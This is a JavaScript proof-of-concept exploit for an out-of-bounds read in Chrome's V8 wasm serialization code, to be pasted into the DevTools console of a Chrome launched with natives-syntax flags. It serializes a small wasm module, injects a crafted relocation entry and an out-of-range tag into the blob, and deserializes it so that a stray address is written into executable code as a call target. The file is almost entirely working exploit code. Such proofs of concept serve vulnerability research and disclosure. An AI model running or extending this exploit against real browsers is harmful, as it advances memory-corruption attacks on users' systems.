// CWE-129 OOB read — browser DevTools console version
// src/wasm/wasm-serialization.cc:1140 + address_from_tag():287
//
// Requires Chrome launched with: --js-flags="--allow-natives-syntax --no-liftoff"
//   google-chrome --js-flags="--allow-natives-syntax --no-liftoff"
//   chromium-browser --js-flags="--allow-natives-syntax --no-liftoff"
//
// Paste this entire file into DevTools console and press Enter.

function poc() {
'use strict';

// ── Minimal wasm: () -> i32.const 42 ──────────────────────────────────────────
const WASM = new Uint8Array([
  0x00,0x61,0x73,0x6d, 0x01,0x00,0x00,0x00,  // magic + version
  0x01,0x05, 0x01,0x60, 0x00,0x01,0x7f,       // type: () -> i32
  0x03,0x02, 0x01,0x00,                        // 1 function, type 0
  0x07,0x05, 0x01,0x01, 0x66,0x00,0x00,       // export "f" = func 0
  0x0a,0x06, 0x01,0x04, 0x00,0x41,0x2a,0x0b, // code: i32.const 42, end
]);

// Step 1: compile + warm 200k iters → TurboFan
console.log('[1] Compiling and warming to TurboFan...');
const mod  = new WebAssembly.Module(WASM);
const inst = new WebAssembly.Instance(mod);
for (let i = 0; i < 200000; i++) inst.exports.f();
console.log('    f() = ' + inst.exports.f());

// Step 2: serialize
// eval() defers the % parse to runtime — avoids parse-time SyntaxError on paste
let blob;
try {
  blob = eval('%SerializeWasmModule(mod)');
} catch (e) {
  // Chrome without --allow-natives-syntax throws ReferenceError or SyntaxError
  console.error('[!] %SerializeWasmModule failed: ' + e);
  console.error('    Relaunch Chrome: google-chrome --js-flags="--allow-natives-syntax --no-liftoff"');
  return;
}
if (!blob) { console.error('[!] %SerializeWasmModule returned null'); return; }
const bv = new Uint8Array(blob);
const dv = new DataView(blob);
console.log('[2] Blob: ' + blob.byteLength + 'B');

// Step 3: parse blob
// Layout: global_header(29B) | func_header(54B) + code[code_size] + reloc[reloc_size]
//   func_header+29: code_size (uint32 LE)
//   func_header+33: reloc_size (uint32 LE)
//   func_header+53: tier (0x02 = TurboFan)
const GLOBAL_HDR  = 29;
const f0          = GLOBAL_HDR;
const code_kind   = bv[f0];
const code_size   = dv.getUint32(f0 + 29, true);
const reloc_size  = dv.getUint32(f0 + 33, true);
const tier        = bv[f0 + 53];
const code_start  = f0 + 54;
const reloc_start = code_start + code_size;

console.log('[3] func0: code_kind=0x' + code_kind.toString(16) +
            ' tier=0x' + tier.toString(16) +
            ' code_size=' + code_size + ' reloc_size=' + reloc_size);

if (tier !== 0x02) {
  console.error('[!] Not TurboFan (tier=0x' + tier.toString(16) +
                '). Relaunch Chrome with --no-liftoff');
  return;
}

// Step 4: craft patched blob
// Inject fake EXTERNAL_REFERENCE reloc: [pc_delta=8, mode=0x2F]
//   mode_byte = (rmode=11 << 2) | 3 = 0x2F
//   iterator: pc_ → code[8]; GetWasmCalleeTag reads code[8..11] = OOB_TAG
//   address_from_tag(OOB_TAG) → external_reference_by_tag_[0x7FFF] (~256KB OOB)
const PC_DELTA          = 8;
const OOB_TAG           = 0x7FFF;
const EXT_REF_MODE_BYTE = (11 << 2) | 3;  // 0x2F

const patched = blob.slice(0);
const pv = new Uint8Array(patched);
const pd = new DataView(patched);

// 4a. replace reloc bytes with crafted entry
pv[reloc_start]     = PC_DELTA;
pv[reloc_start + 1] = EXT_REF_MODE_BYTE;

// 4b. write OOB_TAG at code[PC_DELTA]
const tag_abs   = code_start + PC_DELTA;
const orig_word = [...bv.slice(tag_abs, tag_abs + 4)].map(b => b.toString(16).padStart(2,'0')).join(' ');
pd.setUint32(tag_abs, OOB_TAG, true);
const new_word  = [...pv.slice(tag_abs, tag_abs + 4)].map(b => b.toString(16).padStart(2,'0')).join(' ');
console.log('[4] code[' + PC_DELTA + '..+3]: ' + orig_word + ' → ' + new_word +
            '  (OOB_TAG=0x' + OOB_TAG.toString(16) + ')');

if (2 !== reloc_size) pd.setUint32(f0 + 33, 2, true);

// Step 5: deserialize → triggers vulnerable path
console.log('[5] DeserializeWasmModule → CopyAndRelocate → address_from_tag(0x7FFF)...');
let poisoned_mod;
try {
  poisoned_mod = eval('%DeserializeWasmModule(patched, WASM)');
} catch (e) {
  console.log('[EXCEPTION] ' + e);
  if (/Check failed|DCHECK|FATAL/.test(String(e))) {
    console.log('%c[DEBUG BUILD] DCHECK_GT fired at wasm-serialization.cc:287', 'color:orange;font-weight:bold');
    console.log('  guard present in debug, absent in release — vulnerability confirmed');
  } else {
    console.log('  (crash on OOB read or hijacked call target — release build)');
  }
  return;
}

if (poisoned_mod) {
  console.log('%c╔══════════════════════════════════════════════════════════╗', 'color:red;font-weight:bold');
  console.log('%c║  [RELEASE BUILD] OOB READ + WRITE EXECUTED              ║', 'color:red;font-weight:bold');
  console.log('%c║  external_reference_by_tag_[0x7FFF] read (~256KB OOB)  ║', 'color:red;font-weight:bold');
  console.log('%c║  .bss Address written to executable code as call target  ║', 'color:red;font-weight:bold');
  console.log('%c╚══════════════════════════════════════════════════════════╝', 'color:red;font-weight:bold');
  try {
    const pi = new WebAssembly.Instance(poisoned_mod);
    console.log('  poisoned f() = ' + pi.exports.f() +
                '  (code[8..15] corrupted by OOB .bss Address)');
  } catch (ce) {
    console.log('  [CRASH on call] ' + ce.message +
                ' — OOB Address installed as call target');
  }
}

} poc();
